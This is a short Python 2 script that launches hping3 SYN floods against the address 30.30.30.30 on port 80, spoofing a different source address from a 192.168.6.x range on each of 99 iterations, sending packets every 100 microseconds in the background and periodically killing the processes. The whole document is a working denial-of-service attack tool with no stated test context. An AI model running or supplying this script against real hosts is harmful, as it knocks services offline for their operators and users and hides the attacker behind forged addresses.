#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import sys
import time

dst_ip = "30.30.30.30"
src_ip = "192.168.6.1"

for i in range(0,99):
	ip = src_ip + str(i)
	hping3_syn_cmd = "hping3 -S -V %s -p 80 -a %s -i u100 &" % (dst_ip,ip)
   	print hping3_syn_cmd
   	os.system(hping3_syn_cmd)
   	time.sleep(1)
   	if i%10 == 0:
   		print "killall hping3" 
   		os.system("killall -9 hping3")

print "hping3 over!" 
os.system("killall -9 hping3")